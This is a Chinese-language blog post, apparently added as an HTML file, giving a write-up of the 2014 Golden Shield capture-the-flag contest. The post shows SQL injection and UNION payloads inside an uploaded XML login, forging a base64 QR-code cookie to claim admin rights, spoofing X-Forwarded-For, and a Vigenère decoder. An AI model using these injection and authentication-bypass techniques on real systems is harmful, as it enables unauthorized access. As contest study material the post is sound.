@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>2014 資安競賽金盾獎</title>
+  <meta name="author" content="mkfsn">
+
+
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link href="/favicon.png" rel="icon">
+  <link href="/theme/css/main.css" media="screen, projection"
+        rel="stylesheet" type="text/css">
+  <script src="/theme/js/modernizr-2.0.js"></script>
+  <script src="/theme/js/ender.js"></script>
+  <script src="/theme/js/octopress.js" type="text/javascript"></script>
+
+  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
+</head>
+
+<body>
+  <header role="banner"><hgroup>
+  <h1><a href="/">pelican@Wynebgwrthucher</a></h1>
+</hgroup></header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+</ul>
+
+
+
+<ul class="main-navigation">
+    <li class="active">
+    <a href="/category/security.html">Security</a>
+    </li>
+</ul></nav>
+  <div id="main">
+    <div id="content">
+<div>
+  <article class="hentry" role="article">
+<header>
+      <h1 class="entry-title">2014 資安競賽金盾獎</h1>
+      <p class="meta"><time datetime="2014-11-25T17:03:00+08:00" pubdate>火 25 11月 2014</time></p>
+</header>
+
+  <div class="entry-content"><h1>第一題</h1>
+<hr />
+<h1>第二題</h1>
+<h3>Q: http://aoihonoo.azurewebsites.net/GTest/index.zul 上傳然後想辦法拿到 key 吧</h3>
+<h3>提示: 你會需要文字編輯器</h3>
+<p>總之先把 index.zul 去掉看看會跳什麼東西</p>
+<p>結果得到： <code>You may not pass</code></p>
+<p>並附上一張圖：</p>
+<p><img alt="attack" src="/images/gs2014-3-attack.png" /></p>
+<blockquote>
+<p>順帶一提圖中的女主角叫做 <a href="http://ja.wikipedia.org/wiki/%E9%BB%92%E5%B3%B6%E7%B5%90%E8%8F%9C">黒島結菜</a></p>
+</blockquote>
+<p>往上跳到 http://aoihonoo.azurewebsites.net/ ，是空的。</p>
+<p>再多爬一個 robots.txt ，但是也是空的。</p>
+<p>...</p>
+<p>總而言之，言而總之，最後知道是要上傳 xml 檔案</p>
+<p>隨便寫了一個之後發現，這個 xml 檔就是登入的資訊</p>
+<p>所以要附上帳號密碼。</p>
+<p>在幾次測試之後知道上傳的結構是：</p>
+<div class="highlight"><pre><span class="nt">&lt;xml&gt;</span>
+    <span class="nt">&lt;user&gt;</span>admin<span class="nt">&lt;/user&gt;</span>
+    <span class="nt">&lt;password&gt;</span>admin<span class="nt">&lt;/password&gt;</span>
+<span class="nt">&lt;/xml&gt;</span>
+</pre></div>
+
+
+<p>既然都看到 admin 了，當然免不了測試 SQL injection</p>
+<div class="highlight"><pre><span class="nt">&lt;xml&gt;</span>
+    <span class="nt">&lt;user&gt;</span>admin&#39; or &#39;1&#39;=&#39;1<span class="nt">&lt;/user&gt;</span>
+    <span class="nt">&lt;password&gt;</span>admin<span class="nt">&lt;/password&gt;</span>
+<span class="nt">&lt;/xml&gt;</span>
+</pre></div>
+
+
+<p>然後就得到了大提示：</p>
+<div class="highlight"><pre><span class="n">table_name</span><span class="o">:</span><span class="n">EVANGELION_Misato</span>
+
+<span class="n">hint</span><span class="o">:</span><span class="n">table</span> <span class="n">name</span><span class="err">不是</span><span class="n">key</span>
+
+<span class="err">如果你想使用</span> <span class="n">union</span> <span class="err">解題</span><span class="o">,</span> <span class="n">field</span> <span class="n">name</span> <span class="o">:</span> <span class="n">data</span>
+
+<span class="err">別忘了</span><span class="o">--</span><span class="err">後面加空白</span>
+</pre></div>
+
+
+<p>都給了這樣的提示，不照做就太不給面子了：</p>
+<div class="highlight"><pre><span class="nt">&lt;xml&gt;</span>
+    <span class="nt">&lt;user&gt;</span>admin&#39; UNION SELECT data from EVANGELION_Misato-- <span class="nt">&lt;/user&gt;</span>
+    <span class="nt">&lt;password&gt;</span>admin<span class="nt">&lt;/password&gt;</span>
+<span class="nt">&lt;/xml&gt;</span>
+</pre></div>
+
+
+<hr />
+<h1>第三題</h1>
+<h3>Q: GET the file. GET the key. GET the point. http://192.168.168.150/findthekey/download.php</h3>
+<p>這題超快被秒掉 ... 完全忘記怎麼解他的 XDa</p>
+<hr />
+<h1>第四題</h1>
+<h3>Q: https://kobesystem.azurewebsites.net/</h3>
+<p>這題是給一個 URL，連過去看到 Kobe  的影片</p>
+<p>首先，右上角有兩個按鈕，<code>登入</code> 和 <code>註冊</code></p>
+<p>登入可以先試看看，但是發現好像沒有可以打的地方</p>
+<p>所以就先註冊，進去看看登入後的畫面</p>
+<p>隨便註冊完一組之後，發現連進去也沒什麼東西，空空的</p>
+<p>去檢查 robots.txt 發現：</p>
+<div class="highlight"><pre><span class="n">User</span><span class="o">-</span><span class="n">agent</span><span class="o">:</span> <span class="o">*</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">Account</span><span class="o">/</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">Annabelle</span><span class="o">/</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">Content</span><span class="o">/</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">fonts</span><span class="o">/</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">Models</span><span class="o">/</span>
+<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">Scripts</span><span class="o">/</span>
+</pre></div>
+
+
+<p>全部都試著去連看看，發現 <code>/Annabelle/</code> 這個地方會跳出 <code>只允許管理者</code></p>
+<p>我們做到這邊就卡關了，到最後都沒做出來</p>
+<p>我必須說這題其實很簡單 ... 只是我們還是沒做出來</p>
+<p>所以接下來就直接講解法了</p>
+<p>太感謝主辦單位在比賽結束之後都沒關掉他 XD</p>
+<p>關鍵在 cookie ，我真不懂為什麼我到最後都沒去看 cookie</p>
+<p>cookie 再登入過後多了幾個，其中一個 <code>Permit</code> 的 value 非常的大</p>
+<p>大沒關係，重點是後面多了 <code>=</code></p>
+<div class="highlight"><pre><span class="n">iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAIAAAD</span><span class="o">/</span><span class="n">gAIDAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAOESURBVHhe7ZBJjiQxDAP7</span><span class="o">/</span><span class="mi">5</span><span class="o">+</span><span class="n">uOXQgIVQKhkjbfRnGTSa1mD</span><span class="o">+</span><span class="n">fMCZhCSQsgYQlkLAEEpZAwhJIWAIJSyBhCSQsgYQlkLAEEpZAwhJIWAIJSyBhCZhh</span><span class="o">/</span><span class="n">ezBFBemuDBFJ2EJJCyB3bCoZ9BTuqi7OQgFhHPbVcxO1m6fS93NQSggnNuuYnaydvtc6m4OQgHh3HYVs5O13Qfe4BDPxdqZEW5ubzE7WXvzXKydGeHm9hazk7U3z8XamRFubm8xO1m7fS71uZc3OLouFbOTtdvnUp97eYOj61IxO1m7fS71uZc3OLouFbOTtRfOxVFAKCBc2L7G7GTthXNxFBAKCBe2rzE7WXvhXBwFhALChe1rzE7WiovpmX0AoYBwbruK2cna7XOpuzkIBYRz21XMTtZun0vdzUEoIJzbrmJ2staFKd0HqGcvHkzRMTtZ68IUMRrqc9tVzE7WujBFjIb63HYVv</span><span class="o">/</span><span class="n">Ms</span><span class="o">/</span><span class="n">KP7CcLGJ0</span><span class="o">+</span><span class="n">RsAQSloB5AefPoGfWhbXLiHr7xcYcwf4Z9My6sM6</span><span class="o">+</span><span class="n">TS2</span><span class="o">+</span><span class="mi">2</span><span class="n">Jgj2D</span><span class="o">+</span><span class="n">DnlkX1tm3qcUXm90RHLJ9Lo4CQgeODhzuGWv8zl</span><span class="o">/</span><span class="n">Yv30ljgJCB44OHO4Za</span><span class="o">/</span><span class="n">zOX9i</span><span class="o">/</span><span class="n">fSWOAkIHjg4c7hlrzE7Wdqc8IHTSA44OHB04</span><span class="o">/</span><span class="n">pyEJZCwBHbDekAoIBQQOnDMoKcDxxKsOglLIGEJ</span><span class="o">+</span><span class="n">J1fcEg5hboDx7KL</span><span class="o">+</span><span class="n">uaLit</span><span class="o">/</span><span class="mi">5</span><span class="n">BYd0x73BMfsS9YUXFb</span><span class="o">/</span><span class="n">zCw7pjnuDY</span><span class="o">/</span><span class="n">Yl6gsvKn7nETi</span><span class="o">/</span><span class="n">gNCBYwnWAkIBQSdhCSQsAbOTtS5MWf6EuoBQJOoCQgeODcwR7HdhyiyRB4QiURcQOnBsYI5gvwtTZok8IBSJuoDQgWMDcwT7xQvomX0SYQnWYqbuwLGBOYL9CWsC</span><span class="o">+</span><span class="n">xPWBPaLV1IvXx4QCgizLuqjmEO5qPvAGxzLLuoCQgFh1kV9FHMoF3UfeINj2UVdQCggzLqoj2IO5aLuA29wuF0LsBYQlpKNOYL94repxa4FWAsIS8nGHMF</span><span class="o">+</span><span class="mi">8</span><span class="n">dvUYtcCrAWEpWRjjmC</span><span class="o">/+</span><span class="n">G3q2ZeoCwjdnAeETtrHHMpFy7894Jh1Icwk6gJCJ</span><span class="o">+</span><span class="mi">1</span><span class="n">jDuWi5d8ecMy6EGYSdQGhk</span><span class="o">/</span><span class="n">Yxh3KReBM9s297MK6AcIKEJZCwBHbD8mDKcg6OAkIHjgJCAWGDhCWQsAQOjPh</span><span class="o">/</span><span class="n">SFgCCUsgYQkkLIGEJZCwBBKWQMISSFgCCUsgYQkkLIGEJZCwBBKWQMISSFgCCWvM5</span><span class="o">/</span><span class="n">MP</span><span class="o">+</span><span class="n">EQ35GJELB4AAAAASUVORK5CYII</span><span class="o">=</span>
+</pre></div>
+
+
+<p>相信聰明的人大概就會直接 base64 decode 了</p>
+<p>解碼之後發現，嗯，前面幾個字元寫了 PNG 當然是把它存成 PNG 啦</p>
+<p>於是終於發現 QR code 的圖</p>
+<p><img alt="QRcode" src="/images/gs2014-4.png" /></p>
+<p>讀完這 QRcode 以後，得到一串 JSON :</p>
+<div class="highlight"><pre><span class="p">{</span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
+</pre></div>
+
+
+<p>相信到這邊解法應該很明顯了，就是自己做一個 QRcode 的 PNG 並讓他 decode 以後是：</p>
+<div class="highlight"><pre><span class="p">{</span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span>
+</pre></div>
+
+
+<p>接著把 PNG 做 base64 encode 然後塞到 cookie 裡面</p>
+<p>Python 可以用很簡單的方式達成</p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">json</span>
+
+<span class="c"># pip install qrcode</span>
+<span class="kn">import</span> <span class="nn">qrcode</span>
+
+<span class="n">img</span> <span class="o">=</span> <span class="n">qrcode</span><span class="o">.</span><span class="n">make</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">&#39;isAdmin&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">}))</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;4-admin.png&#39;</span><span class="p">,</span> <span class="s">&#39;wb+&#39;</span><span class="p">)</span>
+<span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+
+<p><img alt="QRcode" src="/images/gs2014-4-admin.png" /></p>
+<p>不過其實只需要 Base64 encode 過後的編碼就好：</p>
+<div class="highlight"><pre><span class="n">iVBORw0KGgoAAAANSUhEUgAAAUoAAAFKAQAAAABTUiuoAAAB9ElEQVR4nO2bUarbMBBFz9SC92nvIEuRd9AldU3dgb2ULKAgfQZsbj8kJw4txXkPOy7MfBghn48LwyhXM46JjTF</span><span class="o">+</span><span class="mi">20</span><span class="n">qCo4466qijju6JWo0AYweQzazPy3a</span><span class="o">/</span><span class="n">uwBHX0GjJCmB</span><span class="o">/</span><span class="n">bgGGLtGQCNJ0jO6jwBHX0HzUkLj5WbQ3gyAUm9HCHB0Q4Q</span><span class="o">/</span><span class="n">dnKAmGZEPkKAo19ApQRAI</span><span class="o">+</span><span class="n">vfIsDRf8RSW62ADIzf1</span><span class="o">/</span><span class="n">fl9frtWh2t6GhmZl11GdbnADAXS3iEAEe3RKmtdQm103313JV6u1ZHKR69OvhGJVtRExpopGFBNLxdq6NLKtr6gLKantLo2ToHWpNCq3IdJqblTUyNiJrq3dmz9X70nq2JUmDSREleXFZeW2dBVwceMVF</span><span class="o">+</span><span class="n">rWryyluvrfOg617GeBEGIJgx2l8BaLxPeDo0m0nXgIb2VjqGtauRA9YfIMDRLVFPwgTVE</span><span class="o">/</span><span class="n">J8</span><span class="o">/</span><span class="n">uEO</span><span class="o">/</span><span class="n">jzoqvNk8Romkbu6NRpAm</span><span class="o">/</span><span class="n">YV4Ojr9617LF4eqvPQ5LV1MvQxO5bSbDVvOQD5Y</span><span class="o">+</span><span class="n">nGn0Sro4</span><span class="o">/</span><span class="n">ZMWPXyKybrfSgynByfwGOvoLeZ8fxGupjNDPIH</span><span class="o">+</span><span class="mi">7</span><span class="n">gz4uOl9rQJaZGGpi9tk6D</span><span class="o">/</span><span class="n">mXSbxCHCcHNRJuwPQU4</span><span class="o">+</span><span class="n">jkHX2bHMXUUGx9</span><span class="o">/</span><span class="n">dgcIcPR19DE77mlUvlCrn6kdI8DRLWH</span><span class="o">+</span><span class="n">rwVHHXXUUUf</span><span class="o">/</span><span class="n">I</span><span class="o">/</span><span class="n">Q3YzI8fAoPYGsAAAAASUVORK5CYII</span><span class="o">=</span>
+</pre></div>
+
+
+<p>把它蓋掉原本的 <code>Permit</code> ，把網頁重新整理過後就變成管理員了！</p>
+<p>可惜他還是會看登入 IP ，所以只好用 X-Forwarded-For 來騙過他</p>
+<p>在傳過去的 HTTP-Header 裡面加入 <code>X-Forwarded-For: 127.0.0.1</code></p>
+<p>再重新整理一次就可以看到：</p>
+<div class="highlight"><pre><span class="n">key</span><span class="o">:</span><span class="n">Inner</span> <span class="n">Peace</span>
+</pre></div>
+
+
+<hr />
+<h1>第五題</h1>
+<h1>第六題</h1>
+<h1>第七題</h1>
+<h1>第八題</h1>
+<h3>Q: 只有密碼庫中的鑰匙能夠逃離此處</h3>
+<h3>提示: 192.168.168.100</h3>
+<p>這題送了一張綠色的圖，左下角放著 QR code</p>
+<p>用軟體去讀之後得到一串字串：c3lzdGVtKCdiaW48bWVvdz4nKQ==</p>
+<p>怎麼看都像是 base64, 拿去 decode 得到：system('bin<meow>')</p>
+<p>看來這就是提示了。</p>
+<h1>第九題</h1>
+<h3>Q: jbnh ybce t owxh xtsix rod d hqoi edheoi swie rvz zee zfozr mb ihsirjbp zla zfhfso dx tsi, uph xrwf cw tgz mb lqf xkvbopsfvvk, vbo wlqfv pvg yrxtwez ovlw wts nhpzo qsf vroz utyiz hf mcs nkmxr. fgxs dki somx csc d puhkez ftgmzu yhjr zi vqr mxgjpw, atwta nitwip vvk nc hhpx hyto gsh aaicw isghv isrk vbjwlubx xggp; vs evv pvg loammj vvzwhh 'xwkmgs chh dwubiu srsp.'vkmk://zlrhm.oqnmshhfewkxn.bpw/wqgrfz.xaj</h3>
+<h3>提示: 那個人</h3>
+<p>這題題目給了一串看起來就是加密過後的密文，後面那串怎麼看就像是 URL</p>
+<p>而且根據其他幾題給的 URL 還不能看出 URL 是 http://<strong><em>_</em>.azurewebsites.net/</strong><strong><em>_.</em></strong></p>
+<p>根據凱薩加密法，密文跟明文是一對一的，但是這題的 http 中的兩個 t 卻是分別對應到 k 跟 m</p>
+<p>根據 wiki ，原來這是一套叫做 <a href="http://zh.wikipedia.org/wiki/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81">維吉尼亞密碼</a></p>
+<p>話不多說，馬上寫一個 decoder</p>
+<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">keyword</span> <span class="o">=</span> <span class="s">&#39;voldemort&#39;</span>
+<span class="c"># a to z</span>
+<span class="n">sample</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="nb">unichr</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">96</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">)]</span>
+
+
+<span class="n">b</span> <span class="o">=</span> <span class="n">sample</span>
+<span class="n">c</span> <span class="o">=</span> <span class="s">&quot;jbnh ybce t owxh xtsix rod d hqoi edheoi swie rvz zee zfozr mb ihsirjbp&quot;</span> \
+    <span class="s">&quot; zla zfhfso dx tsi, uph xrwf cw tgz mb lqf xkvbopsfvvk, vbo wlqfv pvg&quot;</span> \
+    <span class="s">&quot; yrxtwez ovlw wts nhpzo qsf vroz utyiz hf mcs nkmxr. fgxs dki somx csc&quot;</span> \
+    <span class="s">&quot; d puhkez ftgmzu yhjr zi vqr mxgjpw, atwta nitwip vvk nc hhpx hyto gsh&quot;</span> \
+    <span class="s">&quot; aaicw isghv isrk vbjwlubx xggp; vs evv pvg loammj vvzwhh &#39;xwkmgs chh&quot;</span> \
+    <span class="s">&quot; dwubiu srsp.&#39;vkmk://zlrhm.oqnmshhfewkxn.bpw/wqgrfz.xaj&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">decode_char</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="c"># if c is between &#39;a&#39; and &#39;z&#39;</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">&gt;=</span> <span class="mi">97</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">97</span><span class="o">+</span><span class="mi">26</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">[</span><span class="bp">True</span><span class="p">,</span> <span class="nb">unichr</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">l</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">))]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">[</span><span class="bp">False</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span>
+
+
+<span class="n">k</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">-</span><span class="mi">97</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">keyword</span><span class="p">]</span>
+<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
+    <span class="n">rotate</span> <span class="o">=</span> <span class="n">k</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
+    <span class="n">keystring</span> <span class="o">=</span> <span class="n">sample</span><span class="p">[</span><span class="n">rotate</span><span class="p">:]</span> <span class="o">+</span> <span class="n">sample</span><span class="p">[:</span><span class="n">rotate</span><span class="p">]</span>
+    <span class="n">success</span><span class="p">,</span> <span class="n">plainchar</span> <span class="o">=</span> <span class="n">decode_char</span><span class="p">(</span><span class="n">keystring</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">plainchar</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">success</span><span class="p">:</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">9</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>解完之後：</p>
+<div class="highlight"><pre><span class="n">once</span> <span class="n">upon</span> <span class="n">a</span> <span class="n">time</span> <span class="n">there</span> <span class="n">was</span> <span class="n">a</span> <span class="n">dear</span> <span class="n">little</span> <span class="n">girl</span> <span class="n">who</span> <span class="n">was</span> <span class="n">loved</span> <span class="n">by</span> <span class="n">everyone</span> <span class="n">who</span> 
+<span class="n">looked</span> <span class="n">at</span> <span class="n">her</span><span class="p">,</span> <span class="n">but</span> <span class="n">most</span> <span class="n">of</span> <span class="n">all</span> <span class="n">by</span> <span class="n">her</span> <span class="n">grandmother</span><span class="p">,</span> <span class="n">and</span> <span class="n">there</span> <span class="n">was</span> <span class="n">nothing</span> <span class="n">that</span> 
+<span class="n">she</span> <span class="n">would</span> <span class="n">not</span> <span class="n">have</span> <span class="n">given</span> <span class="n">to</span> <span class="n">the</span> <span class="n">child</span><span class="p">.</span> <span class="n">once</span> <span class="n">she</span> <span class="n">gave</span> <span class="n">her</span> <span class="n">a</span> <span class="n">little</span> <span class="n">riding</span> <span class="n">hood</span> <span class="n">of</span> 
+<span class="n">red</span> <span class="n">velvet</span><span class="p">,</span> <span class="n">which</span> <span class="n">suited</span> <span class="n">her</span> <span class="n">so</span> <span class="n">well</span> <span class="n">that</span> <span class="n">she</span> <span class="n">would</span> <span class="n">never</span> <span class="n">wear</span> <span class="n">anything</span> <span class="k">else</span><span class="p">;</span> <span class="n">so</span> 
+<span class="n">she</span> <span class="n">was</span> <span class="n">always</span> <span class="n">called</span> <span class="err">&#39;</span><span class="n">little</span> <span class="n">red</span> <span class="n">riding</span> <span class="n">hood</span><span class="p">.</span><span class="err">&#39;</span><span class="n">http</span><span class="o">:</span><span class="c1">//laoda.azurewebsites.net/sesame.jpg</span>
+</pre></div>
+
+
+<p>得到一張不知道是什麼的圖</p>
+<p><img alt="sesame" src="/images/sesame.jpg" /></p>
+<p>打開來以後發現裡面有幾個關鍵字： <code>aes</code> , <code>256bit</code></p>
+<hr />
+<h1>第十一題</h1>
+<p>這題的提示充滿著： 'SNOW'</p>
+<p>題目是： http://muuni.azurewebsites.net/</p>
+<p>後來發現其實是要去 google <code>steganograph SNOW</code></p>
+<p>然後找到這套軟體：http://www.darkside.com.au/snow/</p></div>
+    <footer>
+<p class="meta">
+  <span class="byline author vcard">
+    Posted by <span class="fn">mkfsn</span>
+  </span>
+<time datetime="2014-11-25T17:03:00+08:00" pubdate>火 25 11月 2014</time>  <span class="categories">
+    <a class="category" href="/tag/security.html">security</a>
+  </span>
+</p><div class="sharing">
+</div>    </footer>
+  </article>
+
+</div>
+<aside class="sidebar">
+  <section>
+    <h1>Recent Posts</h1>
+    <ul id="recent_posts">
+      <li class="post">
+          <a href="/2014-zi-an-jing-sai-jin-dun-jiang.html">2014 資安競賽金盾獎</a>
+      </li>
+    </ul>
+  </section>
+  <section>
+      
+    <h1>Categories</h1>
+    <ul id="recent_posts">
+        <li><a href="/category/security.html">security</a></li>
+    </ul>
+  </section>
+ 
+
+  <section>
+  <h1>Tags</h1>
+    <a href="/tag/security.html">security</a>  </section>
+
+
+    <section>
+        <h1>Social</h1>
+        <ul>
+            <li><a href="https://twitter.com/mkfsn" target="_blank">Twitter</a></li>
+            <li><a href="https://github.com/mkfsn" target="_blank">Github</a></li>
+        </ul>
+    </section>
+    <section>
+        <h1>Blogroll</h1>
+        <ul>
+            <li><a href="#" target="_blank">Pelican</a></li>
+        </ul>
+    </section>
+
+</aside>    </div>
+  </div>
+  <footer role="contentinfo"><p>
+    Copyright &copy;  2014  - mkfsn -
+  <span class="credit">Powered by <a href="http://getpelican.com">Pelican</a></span>
+</p></footer>
+</body>
+</html>
